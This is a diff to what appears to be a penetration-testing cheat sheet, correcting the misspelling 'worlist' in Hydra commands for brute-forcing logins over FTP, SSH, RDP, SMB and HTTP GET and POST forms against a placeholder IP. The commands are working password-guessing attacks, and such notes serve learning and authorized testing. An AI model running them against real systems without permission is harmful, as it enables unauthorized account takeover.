@@ -69,43 +69,43 @@ Below, I'll list the most common services for carrying out brute-force attacks u
 ## FTP
 
 ```bash
-hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> ftp  
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/wordlist> <IP> ftp  
 ```
 
 ## SSH
 
 ```bash
-hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> ssh
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/wordlist> <IP> ssh
 ```
 
 ## RDP 
 
 ```bash
-hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> rdp
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/wordlist> <IP> rdp
 ```
 
 ## SMBv1
 
 ```bash
-hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> smb
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/wordlist> <IP> smb
 ```
 
 ## SMBv2 & SMBv3
 
 ```bash
-hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> smb2
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/wordlist> <IP> smb2
 ```
 
 ## HTTP-GET
 
 ```bash
-hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> http-get /path/
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/wordlist> <IP> http-get /path/
 ```
 
 ## HTTP-POST-FORM
 
 ```bash
-hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/worlist> <IP> http-post-form "/path:username=^USER^&password=^PASS^:Incorrect Username or Password"
+hydra -L </path/to/usernames/wordlist> -P </path/to/passwords/wordlist> <IP> http-post-form "/path:username=^USER^&password=^PASS^:Incorrect Username or Password"
 ```
 
 Depending on what we're up against, we may need to research the tool more thoroughly or practice to learn how to use it efficiently. The techniques listed above are only the most common ones when performing brute-force attacks with **Hydra**, but they won't always work, so it's best to practice.
